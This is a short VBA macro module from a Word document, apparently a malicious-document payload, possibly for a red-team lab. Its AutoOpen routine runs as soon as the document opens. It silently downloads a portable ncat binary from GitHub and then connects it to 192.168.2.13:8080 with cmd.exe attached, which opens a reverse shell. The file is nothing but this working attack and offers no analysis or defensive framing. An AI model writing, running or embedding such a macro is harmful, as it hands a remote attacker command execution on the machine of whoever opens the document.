VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Sub AutoOpen()
    Call Shell("cmd.exe /C  curl -L https://github.com/cyberisltd/NcatPortable/raw/master/ncat.exe -o %USERPROFILE%\Downloads\nc.exe && %USERPROFILE%\Downloads\nc.exe 192.168.2.13 8080 -e cmd.exe", 0)
End Sub
